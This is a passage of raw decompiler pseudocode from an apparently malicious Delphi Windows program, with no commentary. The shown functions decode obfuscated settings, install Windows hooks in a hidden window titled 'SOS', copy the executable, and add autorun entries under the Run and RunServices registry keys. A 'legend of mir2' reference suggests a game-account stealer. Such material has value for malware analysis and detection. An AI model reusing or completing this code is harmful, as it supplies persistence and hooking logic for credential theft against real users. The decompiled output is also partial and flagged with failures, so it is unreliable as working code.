  int v18; // [esp-10h] [ebp-17Ch]
  int v19; // [esp-10h] [ebp-17Ch]
  int v20; // [esp-10h] [ebp-17Ch]
  unsigned int v21[2]; // [esp-Ch] [ebp-178h] BYREF
  int *v22; // [esp-4h] [ebp-170h]
  char *v23; // [esp+Ch] [ebp-160h] BYREF
  __int32 v24; // [esp+10h] [ebp-15Ch] BYREF
  char *v25; // [esp+14h] [ebp-158h] BYREF
  __int32 v26; // [esp+18h] [ebp-154h] BYREF
  __int32 v27; // [esp+1Ch] [ebp-150h] BYREF
  __int32 v28; // [esp+20h] [ebp-14Ch] BYREF
  char *v29; // [esp+24h] [ebp-148h] BYREF
  __int32 v30; // [esp+2Ch] [ebp-140h] BYREF
  __int32 v31; // [esp+34h] [ebp-138h] BYREF
  char *v32; // [esp+38h] [ebp-134h] BYREF
  char *v33; // [esp+3Ch] [ebp-130h] BYREF
  __int32 v34; // [esp+40h] [ebp-12Ch] BYREF
  char *v35; // [esp+44h] [ebp-128h] BYREF
  __int32 v36; // [esp+48h] [ebp-124h] BYREF
  char *v37; // [esp+4Ch] [ebp-120h] BYREF
  char *v38; // [esp+50h] [ebp-11Ch] BYREF
  __int32 v39; // [esp+54h] [ebp-118h] BYREF
  char *v40; // [esp+58h] [ebp-114h] BYREF
  __int32 v41; // [esp+5Ch] [ebp-110h] BYREF
  char *v42; // [esp+60h] [ebp-10Ch] BYREF
  __int32 v43; // [esp+64h] [ebp-108h] BYREF
  char *v44; // [esp+68h] [ebp-104h] BYREF
  __int32 v45; // [esp+6Ch] [ebp-100h] BYREF
  char *v46; // [esp+70h] [ebp-FCh] BYREF
  __int32 v47; // [esp+74h] [ebp-F8h] BYREF
  char *v48; // [esp+78h] [ebp-F4h] BYREF
  __int32 v49; // [esp+7Ch] [ebp-F0h] BYREF
  char *v50; // [esp+80h] [ebp-ECh] BYREF
  __int32 v51; // [esp+84h] [ebp-E8h] BYREF
  __int32 v52; // [esp+88h] [ebp-E4h] BYREF
  __int32 v53; // [esp+8Ch] [ebp-E0h] BYREF
  __int32 v54; // [esp+90h] [ebp-DCh] BYREF
  __int32 v55; // [esp+94h] [ebp-D8h] BYREF
  char *v56; // [esp+98h] [ebp-D4h] BYREF
  char *v57; // [esp+9Ch] [ebp-D0h] BYREF
  __int32 v58; // [esp+A0h] [ebp-CCh] BYREF
  __int32 v59; // [esp+A4h] [ebp-C8h] BYREF
  char *v60; // [esp+A8h] [ebp-C4h] BYREF
  __int32 v61; // [esp+ACh] [ebp-C0h] BYREF
  char *v62; // [esp+B0h] [ebp-BCh] BYREF
  __int32 v63; // [esp+B4h] [ebp-B8h] BYREF
  char *v64; // [esp+B8h] [ebp-B4h] BYREF
  __int32 v65; // [esp+BCh] [ebp-B0h] BYREF
  char *v66; // [esp+C0h] [ebp-ACh] BYREF
  __int32 v67; // [esp+C4h] [ebp-A8h] BYREF
  char *v68; // [esp+C8h] [ebp-A4h] BYREF
  __int32 v69; // [esp+CCh] [ebp-A0h] BYREF
  __int32 v70; // [esp+D0h] [ebp-9Ch] BYREF
  __int32 v71; // [esp+D4h] [ebp-98h] BYREF
  __int32 v72; // [esp+D8h] [ebp-94h] BYREF
  __int32 v73; // [esp+DCh] [ebp-90h] BYREF
  __int32 v74; // [esp+E0h] [ebp-8Ch] BYREF
  char *v75; // [esp+E4h] [ebp-88h] BYREF
  __int32 v76; // [esp+E8h] [ebp-84h] BYREF
  char *v77; // [esp+ECh] [ebp-80h] BYREF
  __int32 v78; // [esp+F0h] [ebp-7Ch] BYREF
  char *v79; // [esp+F4h] [ebp-78h] BYREF
  __int32 v80; // [esp+F8h] [ebp-74h] BYREF
  int v81; // [esp+FCh] [ebp-70h] BYREF
  char v82; // [esp+100h] [ebp-6Ch] BYREF
  int v83[3]; // [esp+144h] [ebp-28h] BYREF
  __int32 *v84; // [esp+150h] [ebp-1Ch]
  __int32 *v85; // [esp+154h] [ebp-18h]
  __int32 *v86; // [esp+158h] [ebp-14h]
  __int32 *v87; // [esp+15Ch] [ebp-10h]
  __int32 *v88; // [esp+160h] [ebp-Ch]
  char v89; // [esp+166h] [ebp-6h]
  char v90; // [esp+167h] [ebp-5h]
  __int32 v91; // [esp+168h] [ebp-4h] BYREF
  int savedregs; // [esp+16Ch] [ebp+0h] BYREF

  sub_404C1C(v83, dword_40105C, 3);
  sub_404C1C(&v81, dword_40BF4C, 3);
  v22 = &savedregs;
  v21[1] = (unsigned int)&loc_42A200;
  v21[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v21);
  sub_40C79C(1, &v80);
  sub_4042C0(off_42B864[0], v80);
  if ( (unsigned __int8)a1 != 1 )
  {
    sub_40E348(*off_42B864[0], &v77);
    sub_40DA70((int)v77, 0, &v78, a1, a2, a3);
    sub_40E348(v78, &v79);
    sub_4042C0(off_42B864[0], (__int32)v79);
  }
  sub_40C79C(2, &v76);
  sub_4042C0(off_42B868, v76);
  if ( !*off_42B868 )
  {
    sub_40E348((int)dword_42A218, &v75);
    sub_4042C0(off_42B868, (__int32)v75);
  }
  sub_40C79C(3, &v74);
  sub_4042C0(off_42B9F8, v74);
  sub_40C79C(5, &v73);
  sub_4042C0(off_42B92C, v73);
  sub_40C79C(8, &v72);
  v16 = v72;
  sub_40C79C(7, &v71);
  v15 = v71;
  sub_40C79C(6, &v70);
  sub_40E49C(v70, v15, v16, 0);
  *(_BYTE *)off_42BA84 = 0;
  sub_40C79C(9, &v69);
  v17 = v69;
  sub_40E348((int)"true", &v68);
  Delphi_CompareCall_404668(v17, (int *)v68);
  if ( v4 )
  {
    *(_BYTE *)off_42BA84 = 1;
    sub_40C79C(10, &v67);
    sub_4042C0(off_42B924, v67);
    sub_40E348(*off_42B924, &v64);
    sub_40DA70((int)v64, 0, &v65, a1, a2, a3);
    sub_40E348(v65, &v66);
    sub_4042C0(off_42B924, (__int32)v66);
  }
  sub_40C79C(4, &v63);
  sub_4042C0(off_42B9AC, v63);
  LOBYTE(a1) = a1 ^ 1;
  if ( (_BYTE)a1 )
  {
    sub_40E348(*off_42B9AC, &v60);
    sub_40DA70((int)v60, 0, &v61, a1, a2, a3);
    sub_40E348(v61, &v62);
    sub_4042C0(off_42B9AC, (__int32)v62);
  }
  v90 = 0;
  *(_BYTE *)off_42BA0C = 0;
  v89 = 1;
  v5 = 1;
  v6 = (volatile __int32 *)off_42B9F4;
  v88 = (__int32 *)off_42BA64;
  v87 = (__int32 *)off_42B8B4;
  v86 = (__int32 *)off_42BA3C;
  v85 = (__int32 *)off_42B914;
  v84 = (__int32 *)off_42B838;
  v7 = (__int32 *)off_42B994;
  do
  {
    sub_40C79C(6 * (v5 - 1) + 11, &v59);
    sub_4042C0(v6, v59);
    sub_40C79C(6 * (v5 - 1) + 12, &v58);
    sub_4042C0(v6 + 1, v58);
    sub_40E348((int)sub_42A234, &v57);
    if ( ((int)sub_404804(v57, (_BYTE *)*off_42B9AC) > 0 || v89)
      && (sub_40E348((int)dword_42A258, &v56), (int)sub_404804(v56, *((_BYTE **)v6 + 1)) > 0) )
    {
      v90 = 1;
      *(_BYTE *)off_42BA0C = 1;
      sub_40C79C(6 * (v5 - 1) + 13, &v55);
      sub_4042C0(v6 + 2, v55);
      sub_40C79C(6 * (v5 - 1) + 14, &v54);
      sub_4042C0(v6 + 3, v54);
      sub_40C79C(6 * (v5 - 1) + 15, &v53);
      sub_4042C0(v6 + 4, v53);
      sub_40C79C(6 * (v5 - 1) + 16, &v52);
      sub_4042C0(v6 + 5, v52);
    }
    else if ( !v90 )
    {
      sub_4042C0(v6, *v88);
      sub_4042C0(v6 + 1, *v87);
      sub_4042C0(v6 + 2, *v86);
      sub_4042C0(v6 + 3, *v85);
      sub_4042C0(v6 + 4, *v84);
      sub_4042C0(v6 + 5, *v7);
    }
    ++v5;
    ++v7;
    ++v84;
    ++v85;
    ++v86;
    ++v87;
    ++v88;
    v6 += 6;
  }
  while ( v5 != 4 );
  v8 = 1;
  v9 = v83;
  do
  {
    sub_40C79C(v8 + 28, &v51);
    sub_4042C0(v9, v51);
    sub_40E348(*v9, &v50);
    if ( (int)sub_404804(dword_42A258, v50) <= 0 )
      sub_40426C(v9);
    ++v8;
    ++v9;
  }
  while ( v8 != 4 );
  sub_40E440(v83);
  sub_40C79C(32, &v49);
  sub_4042C0(off_42B94C, v49);
  sub_40E348(*off_42B94C, &v46);
  sub_40DA70((int)v46, 0, &v47, (int)v6, 4, (int)v9);
  sub_40E348(v47, &v48);
  sub_4042C0(off_42B94C, (__int32)v48);
  sub_40C79C(33, &v45);
  sub_4042C0(off_42B95C, v45);
  sub_40E348(*off_42B95C, &v42);
  sub_40DA70((int)v42, 0, &v43, (int)v6, 4, (int)v9);
  sub_40E348(v43, &v44);
  sub_4042C0(off_42B95C, (__int32)v44);
  sub_40C79C(34, &v41);
  sub_4042C0(off_42B860[0], v41);
  sub_40E348(*off_42B860[0], &v38);
  sub_40DA70((int)v38, 0, &v39, (int)v6, 4, (int)v9);
  sub_40E348(v39, &v40);
  sub_4042C0(off_42B860[0], (__int32)v40);
  *(_DWORD *)off_42BA28 = 1;
  *(_DWORD *)off_42BA80 = 1;
  byte_42E15C = 0;
  sub_40E348((int)sub_42A234, &v37);
  if ( (int)sub_404804(v37, (_BYTE *)*off_42B9AC) <= 0 )
  {
    sub_40C79C(50, &v36);
    v18 = v36;
    sub_40E348((int)"true", &v35);
    Delphi_CompareCall_404668(v18, (int *)v35);
    if ( v4 )
      byte_42E15C = 1;
  }
  sub_40C79C(35, &v34);
  v19 = v34;
  sub_40E348((int)"true", &v33);
  Delphi_CompareCall_404668(v19, (int *)v33);
  if ( v4 )
  {
    sub_40C79C(36, &v31);
    sub_40E348(v31, &v32);
    if ( (int)sub_404804(dword_42A258, v32) > 0 )
    {
      sub_40C79C(36, &v30);
      sub_40E3DC(v30);
    }
    else
    {
      byte_42E15C = 1;
    }
  }
  else
  {
    sub_40E3DC((int)"c~*(,(+*Y(/*7zvt");
  }
  *(_DWORD *)off_42BA08 = 0;
  v10 = 1;
  v11 = &v81;
  do
  {
    sub_40C79C(4 * (v10 - 1) + 38, &v91);
    sub_40E348(v91, &v29);
    if ( (int)sub_404804(dword_42A258, v29) > 0 )
    {
      sub_40C79C(4 * (v10 - 1) + 37, &v28);
      sub_4042C0(v11, v28);
      sub_4042C0(v11 + 1, v91);
      sub_40C79C(4 * (v10 - 1) + 39, &v27);
      sub_4042C0(v11 + 4, v27);
      sub_40C79C(4 * (v10 - 1) + 40, &v26);
      sub_4042C0(v11 + 5, v26);
    }
    ++v10;
    v11 += 6;
  }
  while ( v10 != 4 );
  sub_40E348((int)sub_42A234, &v25);
  if ( (int)sub_404804(v25, (_BYTE *)*off_42B9AC) <= 0 && !v89 && v90 )
  {
    v12 = 3;
    v13 = &v82;
    v84 = (__int32 *)off_42B9F4;
    do
    {
      if ( *(_DWORD *)v13 )
        sub_404DDC((int)v84, (int)(v13 - 4), (int)dword_40BF4C);
      v84 += 6;
      v13 += 24;
      --v12;
    }
    while ( v12 );
  }
  sub_40E46C((int)&v81);
  *off_42BA78 = 1;
  sub_40C79C(51, &v24);
  v20 = v24;
  sub_40E348((int)"false", &v23);
  Delphi_CompareCall_404668(v20, (int *)v23);
  if ( v4 )
    *off_42BA78 = 0;
  __writefsdword(0, v21[0]);
  v22 = (int *)&loc_42A207;
  sub_404290((int)&v23, 60);
  sub_404CE4(&v81, (char *)dword_40BF4C, 3);
  sub_404CE4(v83, (char *)dword_40105C, 3);
  return sub_40426C(&v91);
}
// 429AAC: variable 'v4' is possibly undefined
// 40105C: using guessed type int dword_40105C[2];
// 40BF4C: using guessed type int dword_40BF4C[5];
// 42A218: using guessed type int dword_42A218[3];
// 42A234: using guessed type int __far sub_42A234();
// 42A258: using guessed type int dword_42A258[3];
// 42B838: using guessed type char **off_42B838;
// 42B860: using guessed type int *off_42B860[3];
// 42B864: using guessed type int *off_42B864[2];
// 42B868: using guessed type int *off_42B868;
// 42B8B4: using guessed type char **off_42B8B4;
// 42B914: using guessed type char **off_42B914;
// 42B924: using guessed type int *off_42B924;
// 42B92C: using guessed type int *off_42B92C;
// 42B94C: using guessed type int *off_42B94C;
// 42B95C: using guessed type int *off_42B95C;
// 42B994: using guessed type char **off_42B994;
// 42B9AC: using guessed type int *off_42B9AC;
// 42B9F4: using guessed type int (*off_42B9F4)[18];
// 42B9F8: using guessed type int *off_42B9F8;
// 42BA08: using guessed type void *off_42BA08;
// 42BA0C: using guessed type void *off_42BA0C;
// 42BA28: using guessed type void *off_42BA28;
// 42BA3C: using guessed type char **off_42BA3C;
// 42BA64: using guessed type char **off_42BA64;
// 42BA78: using guessed type char *off_42BA78;
// 42BA80: using guessed type void *off_42BA80;
// 42BA84: using guessed type void *off_42BA84;
// 42E15C: using guessed type char byte_42E15C;
// 4298FC: using guessed type int var_28[3];

//----- (0042A288) --------------------------------------------------------
LRESULT __stdcall sub_42A288(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
  void *v4; // ecx

  if ( Msg == 2 )
  {
    if ( hhk )
      UnhookWindowsHookEx(hhk);
    if ( dword_42CD1C )
      UnhookWindowsHookEx(dword_42CD1C);
    sub_40BEA8();
    sub_40417C(v4);
  }
  return DefWindowProcA(hWnd, Msg, wParam, lParam);
}
// 42A2C3: variable 'v4' is possibly undefined

//----- (0042A2E0) --------------------------------------------------------
__int16 sub_42A2E0()
{
  HWND Window; // eax

  hInstance = hmod;
  WndClass.style = 192;
  WndClass.lpfnWndProc = sub_42A288;
  WndClass.hInstance = hInstance;
  WndClass.hbrBackground = (HBRUSH)16;
  WndClass.lpszClassName = "TN1aN1a1D1E";
  WndClass.hCursor = LoadCursorA(0, (LPCSTR)0x7F00);
  LOWORD(Window) = RegisterClassA(&WndClass);
  if ( (_WORD)Window )
  {
    Window = CreateWindowExA(0x100u, "TN1aN1a1D1E", "SOS", 0xCC0000u, 0, 0, 10, 10, 0, 0, hInstance, 0);
    hWnd = Window;
    if ( Window )
    {
      sub_40BD50();
      SetTimer(hWnd, 1u, 0x5DCu, (TIMERPROC)TimerFunc);
      SetTimer(hWnd, 2u, 0xEA60u, sub_42974C);
      ShowWindow(hWnd, 0);
      while ( GetMessageA(&Msg, hWnd, 0, 0) )
      {
        TranslateMessage(&Msg);
        DispatchMessageA(&Msg);
      }
      LOWORD(Window) = sub_40BEA8();
    }
  }
  return (__int16)Window;
}

//----- (0042A3F0) --------------------------------------------------------
int sub_42A3F0()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_42A468;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  sub_404CE4((int *)off_42B7FC, (char *)dword_40105C, 5);
  sub_404CE4((int *)&off_42B7E4, (char *)dword_40105C, 6);
  sub_404CE4((int *)&off_42B7D0, (char *)dword_40105C, 5);
  sub_405868(&dword_42E148, (int)dword_424270);
  sub_40426C(&dword_42E140);
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 40105C: using guessed type int dword_40105C[2];
// 424270: using guessed type int dword_424270[3];
// 42B7D0: using guessed type char *off_42B7D0;
// 42B7E4: using guessed type char *off_42B7E4;
// 42B7FC: using guessed type char *off_42B7FC[5];
// 42E140: using guessed type int dword_42E140;
// 42E148: using guessed type int dword_42E148;

//----- (0042A564) --------------------------------------------------------
void __usercall __noreturn start(int a1@<ebx>, int a2@<esi>)
{
  volatile __int32 *v2; // edi
  char v3; // zf
  int v4; // esi
  char *v5; // eax
  void *v6; // ebx
  char *v7; // eax
  int v8; // esi
  char *v9; // eax
  char *v10; // eax
  char *v11; // eax
  char *v12; // eax
  void *v13; // ecx
  struct _STARTUPINFOA *v14; // [esp-14h] [ebp-B4h]
  int v15; // [esp-10h] [ebp-B0h]
  struct _PROCESS_INFORMATION *v16; // [esp-10h] [ebp-B0h]
  char *v17; // [esp-10h] [ebp-B0h]
  unsigned int v18[2]; // [esp-Ch] [ebp-ACh] BYREF
  int *v19; // [esp-4h] [ebp-A4h]
  char *v20; // [esp+Ch] [ebp-94h] BYREF
  __int32 v21; // [esp+10h] [ebp-90h] BYREF
  char *v22; // [esp+14h] [ebp-8Ch] BYREF
  __int32 v23; // [esp+18h] [ebp-88h] BYREF
  char *v24; // [esp+1Ch] [ebp-84h] BYREF
  char *v25; // [esp+20h] [ebp-80h] BYREF
  char *v26; // [esp+24h] [ebp-7Ch] BYREF
  char *v27; // [esp+28h] [ebp-78h] BYREF
  char *v28; // [esp+2Ch] [ebp-74h] BYREF
  __int32 v29; // [esp+30h] [ebp-70h] BYREF
  char *v30; // [esp+34h] [ebp-6Ch] BYREF
  char *v31; // [esp+38h] [ebp-68h] BYREF
  char *v32; // [esp+3Ch] [ebp-64h] BYREF
  char *v33; // [esp+40h] [ebp-60h] BYREF
  char *v34; // [esp+44h] [ebp-5Ch] BYREF
  char *v35; // [esp+48h] [ebp-58h] BYREF
  char *v36; // [esp+4Ch] [ebp-54h] BYREF
  char *v37; // [esp+50h] [ebp-50h] BYREF
  char *v38; // [esp+54h] [ebp-4Ch] BYREF
  char *v39; // [esp+58h] [ebp-48h] BYREF
  char *v40; // [esp+5Ch] [ebp-44h] BYREF
  char *v41; // [esp+60h] [ebp-40h] BYREF
  char *v42; // [esp+64h] [ebp-3Ch] BYREF
  char *v43; // [esp+68h] [ebp-38h] BYREF
  __int32 v44; // [esp+6Ch] [ebp-34h] BYREF
  char *v45; // [esp+70h] [ebp-30h] BYREF
  __int32 v46; // [esp+74h] [ebp-2Ch] BYREF
  char *v47; // [esp+78h] [ebp-28h] BYREF
  __int32 v48; // [esp+7Ch] [ebp-24h] BYREF
  char *v49; // [esp+80h] [ebp-20h] BYREF
  __int32 v50; // [esp+84h] [ebp-1Ch] BYREF
  char *v51; // [esp+88h] [ebp-18h] BYREF
  __int32 v52[5]; // [esp+8Ch] [ebp-14h] BYREF
  int savedregs; // [esp+A0h] [ebp+0h] BYREF

  sub_4065B8((int)&dword_42A474, (struct _EXCEPTION_REGISTRATION_RECORD *)&savedregs);
  v2 = off_42B990;
  v19 = &savedregs;
  v18[1] = (unsigned int)&loc_42AAE5;
  v18[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v18);
  sub_40426C(off_42B93C);
  *off_42B960 = 0;
  sub_40C79C(52, v52);
  v15 = v52[0];
  sub_40E348((int)"true", &v51);
  Delphi_CompareCall_404668(v15, (int *)v51);
  if ( v3 )
  {
    *off_42B960 = 1;
    sub_40C79C(53, &v48);
    sub_40E348(v48, &v49);
    sub_40DA70((int)v49, 0, &v50, a1, (int)v2, a2);
    sub_4042C0(off_42B93C, v50);
  }
  else
  {
    sub_40C79C(54, (volatile __int32 *)&v47);
    sub_4232AC(v47, 4);
  }
  *off_42B90C = 1;
  *off_42B984 = 1;
  sub_4029D0(0, &v45);
  sub_407F7C(v45, ".tmp", &v46);
  sub_4042C0(v2, v46);
  sub_423168(*v2, (int)".tmp", &v44, a1);
  sub_4042C0(v2, v44);
  sub_4029D0(0, &v43);
  if ( sub_423548(v43, *(char **)v2) )
  {
    sub_407DF8(*(char **)v2, 2u);
    v4 = sub_402970();
    if ( v4 > 0 )
    {
      a1 = 1;
      while ( 1 )
      {
        sub_4029D0(a1, &v42);
        Delphi_CompareCall_404668((int)v42, (int *)"/zhj");
        if ( v3 )
          break;
        sub_4029D0(a1, &v41);
        sub_4045E4(v2, 3);
        ++a1;
        if ( !--v4 )
          goto LABEL_10;
      }
      ++*off_42B90C;
    }
LABEL_10:
    if ( *off_42B90C <= 1 )
    {
      sub_402E48((char *)lpStartupInfo, 68, 0);
      lpStartupInfo->cb = 68;
      lpStartupInfo->dwFlags = 1;
      lpStartupInfo->wShowWindow = 1;
      v16 = lpProcessInformation;
      v14 = lpStartupInfo;
      v5 = sub_40471C(*(char **)v2);
      CreateProcessA(0, v5, 0, 0, -1, 0x30u, 0, 0, v14, v16);
      v6 = (void *)sub_407CD8(*(char **)v2, 16);
      if ( *off_42B82C < 15 )
        sub_4240C0((int)v6, (int)v2, v4);
      WaitForSingleObject(lpProcessInformation->hProcess, 0xFFFFFFFF);
      sub_407DF0(v6);
      CloseHandle_0(lpProcessInformation->hProcess);
      if ( sub_40C2F4(*(char **)v2) )
      {
        v7 = sub_40471C(*(char **)v2);
        sub_40445C(&v40, v7);
        sub_407F14(v40);
      }
    }
    else if ( *off_42B82C < 15 )
    {
      sub_4240C0(a1, (int)v2, v4);
    }
  }
  else
  {
    *off_42B90C = 2;
    v8 = sub_402970();
    if ( v8 > 0 )
    {
      a1 = 1;
      while ( 1 )
      {
        sub_4029D0(a1, &v39);
        Delphi_CompareCall_404668((int)v39, (int *)"/zhj");
        if ( v3 )
          break;
        ++a1;
        if ( !--v8 )
          goto LABEL_22;
      }
      ++*off_42B90C;
    }
LABEL_22:
    GetModuleFileNameA_0(0, (LPSTR)&ExistingFileName, 0x100u);
    sub_40D304(&v37);
    sub_4045E4((volatile __int32 *)&v38, 3);
    v9 = sub_40471C(v38);
    CopyFileA((LPCSTR)&ExistingFileName, v9, 0);
    sub_40D304(&v35);
    v17 = v35;
    sub_4045E4((volatile __int32 *)&v36, 3);
    v10 = sub_40471C(v36);
    sub_40E67C(HKEY_LOCAL_MACHINE, "SoftWare\\Microsoft\\Windows\\CurrentVersion\\RunServices", "SOS", 1, (BYTE *)v10);
    sub_40D304(&v33);
    sub_4045E4((volatile __int32 *)&v34, 3);
    v11 = sub_40471C(v34);
    sub_40E67C(HKEY_CURRENT_USER, "SoftWare\\Microsoft\\Windows\\CurrentVersion\\Run", "SOS", 1, (BYTE *)v11);
    sub_40C65C((char *)&ExistingFileName, &v31);
    sub_40C214((int)v31, &v32);
    sub_40D304(&v28);
    sub_4045E4(&v29, 3);
    sub_40C214(v29, &v30);
    Delphi_CompareCall_404668((int)v17, (int *)v30);
    if ( v3 )
    {
      if ( *off_42B90C <= 2 )
      {
        sub_4029D0(0, &v22);
        sub_407F7C(v22, ".sys", &v23);
        sub_4042C0(v2, v23);
        sub_423168(*v2, (int)".sys", &v21, a1);
        sub_4042C0(v2, v21);
        sub_4029D0(0, &v20);
        sub_42399C(v20, *(char **)v2, a1, (int)v2, v8);
      }
      qmemcpy(&ExistingFileName, dword_42ABDC, 0x100u);
      if ( (unsigned int)(sub_40D394() - 1) < 2 )
      {
        *(_BYTE *)off_42BA40 = 1;
        sub_40BFB4();
      }
      if ( *(_BYTE *)off_42BA40 )
        sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", "WinX", 1, (BYTE *)&dword_42ACF8);
      else
        sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", "WinX", 1, (BYTE *)"1");
      if ( !FindWindowA("TN1aN1a1D1E", "SOS") )
      {
        *(_BYTE *)off_42BA40 = 0;
        sub_4298FC(0, (int)(&ExistingFileName + 256), (int)&dword_42ABDC[64]);
        sub_40CE30();
        sub_42A2E0();
      }
    }
    else
    {
      if ( *off_42B90C > 2 )
      {
        sub_40D304(&v24);
        sub_4045E4((volatile __int32 *)&v25, 3);
        v12 = sub_40471C(v25);
      }
      else
      {
        sub_40D304(&v26);
        sub_4045E4((volatile __int32 *)&v27, 3);
        v12 = sub_40471C(v27);
      }
      WinExec(v12, 5u);
    }
  }
  __writefsdword(0, v18[0]);
  v19 = (int *)&loc_42AAEC;
  sub_404290((int)&v20, 33);
  sub_40417C(v13);
}
// 42A5CE: variable 'v3' is possibly undefined
// 42AAEF: variable 'v13' is possibly undefined
// 42A474: using guessed type int dword_42A474;
// 42ABDC: using guessed type int dword_42ABDC[64];
// 42B82C: using guessed type int *off_42B82C;
// 42B90C: using guessed type int *off_42B90C;
// 42B93C: using guessed type int *off_42B93C;
// 42B960: using guessed type char *off_42B960;
// 42B984: using guessed type int *off_42B984;
// 42B990: using guessed type int *off_42B990;
// 42BA40: using guessed type void *off_42BA40;
// 42A564: using guessed type __int32 var_14[5];

// nfuncs=1536 queued=1162 decompiled=1162 lumina nreq=0 worse=0 better=0
#error "There were 14 decompilation failure(s) on 1162 function(s)"
